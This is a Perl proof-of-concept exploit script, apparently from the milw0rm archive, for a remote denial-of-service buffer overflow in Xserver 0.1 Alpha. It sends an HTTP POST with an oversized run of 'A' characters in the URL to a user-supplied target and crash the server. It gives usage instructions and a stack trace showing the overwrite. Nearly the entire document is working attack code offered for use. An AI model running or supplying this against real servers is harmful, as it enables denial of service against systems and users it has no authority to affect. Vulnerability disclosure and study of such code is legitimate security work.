#!/usr/bin/perl
#
#      _                                    _                   _  
#   __| | ___ _   _ ___  ___ ___  _ __  ___| |_ _ __ _   _  ___| |_
#  / _` |/ _ \ | | / __|/ __/ _ \| '_ \/ __| __| '__| | | |/ __| __|
# | (_| |  __/ |_| \__ \ (_| (_) | | | \__ \ |_| |  | |_| | (__| |_ 
#  \__,_|\___|\__,_|___/\___\___/|_| |_|___/\__|_|   \__,_|\___|\__|
#                      d.e.u.s..c.o.n.s.t.r.u.c.t
#
# Type       -> Proof-of-Concept (P0C) Remote DoS Buffer Overflow
# App        -> Xserver 0.1 Alpha
# URL  	     -> http://sourceforge.net/projects/xserver/
# Found By   -> deusconstruct
#
# Stack trace:
# Frame     Function  Args
# 18FDC978  610DE824  (41414141, 004020E4, 0040202E, 00000000)
# 18FDCD58  004015D4  (41414141, 41414141, 41414141, 41414141)
#
# Usage: perl xserver-dos-poc.pl www.target.com

use LWP::UserAgent;

$uniq = LWP::UserAgent->new;
$url = shift or die("Please insert a target domain or IP!");
$buffer = 150; # Teh evil 0verflow ammount

print "\n============================\n";
print "Xserver 0.1 Alpha Remote DoS\n";
print "DiSc0vEreD by deusconstruct\n";
print "============================\n";
print "\n";
print "[+] Sending evil buffer to $url ...\n";
$req = HTTP::Request->new(POST => "http://$url/" . A x $buffer);
$res = $uniq->request($req);
print "[+] Evil buffer sent! Enj0y!\n";

# milw0rm.com [2007-07-23]